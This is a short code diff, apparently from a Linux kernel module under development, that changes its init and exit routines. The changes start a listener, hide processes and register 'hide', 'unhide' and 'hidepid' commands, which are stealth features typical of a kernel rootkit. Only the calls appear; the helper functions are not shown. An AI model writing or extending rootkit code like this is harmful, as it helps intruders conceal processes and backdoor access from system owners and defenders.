@@ -15,14 +15,20 @@
 
 static int __init mod_init(void)
 {
-  hide_sockets();
+  listen();
+  hide_processes();
+  add_command("hide", NOARG, hide_code);
+  add_command("unhide", NOARG, unhide_code);
+  add_command("intlist", INTLST, NULL);
+  add_command("hidepid", INTARG, hide_process);
   printk(KERN_INFO "mod_init\n");
   return 0;
 }
 
 static void __exit mod_exit(void)
 {
-  unhide_sockets();
+  stop_listen();
+  unhide_processes();
 }
 
 
